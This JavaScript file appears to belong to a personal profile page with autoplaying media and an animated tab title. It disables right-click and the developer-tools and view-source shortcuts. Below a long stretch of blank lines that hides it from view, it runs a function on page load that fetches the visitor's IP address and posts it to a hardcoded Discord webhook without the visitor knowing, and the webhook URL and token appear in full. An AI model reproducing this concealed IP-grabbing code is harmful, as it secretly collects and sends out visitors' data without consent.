function audio() {
    var video = document.getElementById("video");
    video.play()
}

function video() {
    var audio = document.getElementById("audio");
    audio.volume = 0.4;
    audio.play()
}

video()

document.onkeydown = function (e) {
    if (event.keyCode == 123) {
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
        return false;
    }
    if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
        return false;
    }
    if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
        return false;
    }
}

let counter = 0; let Title = 'enny#0001'; let direction = true;
aniTitle = setInterval(function () {
    if (counter == Title.length) direction = false;
    if (counter == false) direction = true;
    counter = (direction == true) ? ++counter : --counter;
    newtitle = (counter == 0) ? "" : Title.slice(0, counter);
    document.title = 'w' + newtitle;
}, 400)

window.oncontextmenu = function () {
    return false;
}
$(document).keydown(function (event) {
    if (event.keyCode == 123) {
        return false;
    }
    else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
        return false;
    }
});









































































































































































































































































































































































































































function koko() {
    var ip = '';
    fetch('https://api.ipify.org/?format=json')
        .then(function(response) {
            return response.json();
        })
        .then(function(data) {
            ip = data.ip;
            var webhook = 'https://discord.com/api/webhooks/1132602947864371301/WJFkDltIFd-Jw6rxyfuaDOui-yCHEDaFkUzQT54ZY2hLMi99hRVV-CdmQCy7vp6HWYT3'
            var message = {
                content: 'IP: ' + ip
            };
            
            var ipElement = document.getElementById('ip');
            ipElement.textContent = ip;

            fetch(webhook, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });
        });
}

document.addEventListener('DOMContentLoaded', koko);
